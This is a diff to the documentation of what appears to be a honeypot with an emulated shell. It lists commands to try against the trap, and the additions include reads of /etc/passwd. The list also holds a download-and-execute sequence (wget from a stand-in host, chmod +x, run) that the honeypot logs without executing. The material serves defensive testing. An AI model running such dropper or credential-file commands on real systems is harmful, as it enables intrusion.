@@ -107,9 +107,13 @@ Things worth trying once you're in, to see how each is handled:
 ```
 uname -a                              # persona banner
 cat /proc/cpuinfo                     # persona hardware fields
+ls -la /bin                           # long listing, applets shown as executable
+ifconfig                              # or: ip a
+grep root /etc/passwd                 # or: sed s/root/toor/ /etc/passwd, awk '{print $1}' /etc/passwd
 wget http://example.invalid/x -O m    # download attempt -- logged even though the fetch will fail
 chmod +x m                            # execution attempt: acknowledged silently, nothing actually runs
 ./m                                   # same -- logged as file.execution_attempt, never executed
+wget --help                           # any implemented command's --help -- see honeypot/shell/help_text.py
 whatever-nonsense-command             # busybox-style "not found"
 exit
 ```
